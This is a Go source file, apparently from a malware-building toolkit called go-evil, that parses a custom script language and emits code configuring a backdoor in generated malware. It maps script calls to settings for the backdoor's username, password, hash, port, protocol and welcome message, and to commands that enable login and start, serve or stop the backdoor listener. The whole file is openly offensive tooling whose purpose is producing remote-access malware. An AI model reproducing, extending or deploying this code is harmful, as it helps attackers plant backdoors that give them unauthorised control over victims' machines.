package backdoor

import (
	"regexp"

	mal "github.com/s9rA16Bf4/go-evil/domains/malware/private"
	"github.com/s9rA16Bf4/notify_handler/go/notify"
)

const (
	EXTRACT_SUBDOMAIN = "[a-z]+\\.([a-z]+)\\.([a-z]+)\\(\"(.*)\"\\);"
	EXTRACT_FUNCTION  = "backdoor\\.([a-z]+)\\((\"(.+)\")?\\);"
)

func Parse(new_line string) {
	regex := regexp.MustCompile(EXTRACT_SUBDOMAIN)
	result := regex.FindAllStringSubmatch(new_line, -1)
	if len(result) > 0 { // There is a subdomain to extract
		switch result[0][1] {
		case "set":
			switch result[0][2] {
			case "hash":
				mal.AddContent("back.Set_hash(\"" + result[0][3] + "\")")
			case "user":
				mal.AddContent("back.Set_username(\"" + result[0][3] + "\")")
			case "password":
				mal.AddContent("back.Set_password(\"" + result[0][3] + "\")")
			case "port":
				mal.AddContent("back.Set_port(\"" + result[0][3] + "\")")
			case "protocol":
				mal.AddContent("back.Set_protocol(\"" + result[0][3] + "\")")
			case "welcome":
				mal.AddContent("back.Set_welcome_msg(\"" + result[0][3] + "\")")
			case "read_size":
				mal.AddContent("back.Set_read_size(\"" + result[0][3] + "\")")
			default:
				function_error(result[0][2])
			}
		case "login":
			switch result[0][2] {
			case "enable":
				mal.AddContent("back.Enable_login()")
			case "disable":
				mal.AddContent("back.Disable_login()")
			default:
				function_error(result[0][2])
			}
		default:
			subdomain_error(result[0][1])
		}
	} else { // There might be a function which doesn't require a subdomain to work
		regex = regexp.MustCompile(EXTRACT_FUNCTION)
		result = regex.FindAllStringSubmatch(new_line, -1)
		if len(result) > 0 {
			switch result[0][1] {
			case "start":
				mal.AddContent("back.Start()")
			case "serve":
				mal.AddContent("back.Serve()")
			case "stop":
				mal.AddContent("back.Close()")
			default:
				function_error(result[0][1])
			}
		}
	}
}
func subdomain_error(subdomain string) {
	notify.Error("Unknown subdomain "+subdomain, "backdoor.Parse()")
}
func function_error(function string) {
	notify.Error("Unknown function "+function, "backdoor.Parse()")
}
